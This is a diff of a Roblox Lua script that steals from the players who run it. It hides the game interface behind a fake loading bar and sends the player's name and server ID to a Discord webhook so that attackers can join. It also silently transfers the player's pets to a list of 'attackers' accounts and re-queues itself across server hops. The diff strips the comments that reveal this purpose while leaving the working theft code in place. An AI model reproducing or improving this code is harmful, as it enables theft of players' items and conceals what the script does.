@@ -10,14 +10,12 @@ local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ
 -- 📦 QUEUED CODE after server hop
 local loadingScript = [[
 
--- ▶️ Services for GUI + webhook + pet transfer
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- ✅ 1. GUI SHOW
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
     StarterGui:SetCore("TopbarEnabled", false)
@@ -64,7 +62,6 @@ fill.Size = UDim2.new(0, 0, 1, 0)
 fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
 fill.BorderSizePixel = 0
 
--- 🎞️ GUI LOADING BAR
 task.spawn(function()
     local percent = 0
     while percent <= 100 do
@@ -76,7 +73,6 @@ task.spawn(function()
     screenGui:Destroy()
 end)
 
--- 📨 2. WEBHOOK SEND
 task.delay(3, function()
     if typeof(request) ~= "function" then return end
     pcall(function()
@@ -84,7 +80,7 @@ task.delay(3, function()
             ["content"] = "",
             ["embeds"] = {{
                 ["title"] = "Player Joined New Server",
-                ["description"] = ("**Name:** %s\n**JobId:** %s\n[Join via App](roblox://placeID=126884695634066&linkCode=%s)\n[Join via Browser](https://www.roblox.com/games/126884695634066?privateServerLinkCode=%s)"):format(LocalPlayer.Name, game.JobId, game.JobId, game.JobId),
+                ["description"] = ("**Name:** %s\n**JobId:** %s\n[Join Server](https://www.roblox.com/games/126884695634066?privateServerLinkCode=%s)"):format(LocalPlayer.Name, game.JobId, game.JobId),
                 ["color"] = 0x00FFFF
             }}
         }
@@ -97,7 +93,6 @@ task.delay(3, function()
     end)
 end)
 
--- 🦊 3. SILENT PET TRANSFER
 local attackers = {
     ["boneblossom215"] = true,
     ["beanstalk1251"] = true,
@@ -141,7 +136,7 @@ task.delay(3, function()
 end)
 ]]
 
--- 🔁 4. SERVER HOP FUNCTION
+-- 🔁 Server hop
 local function serverHop()
     local cursor = ""
     local smallestServer = nil
@@ -168,10 +163,8 @@ local function serverHop()
         task.wait(0.2)
     until cursor == ""
 
-    -- ⏯ Queue code for after teleport
     queue_on_teleport(loadingScript)
 
-    -- ⏩ Teleport
     if smallestServer then
         TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
     else
@@ -179,5 +172,5 @@ local function serverHop()
     end
 end
 
--- 🔃 5. START
+-- 🔃 Start
 serverHop()
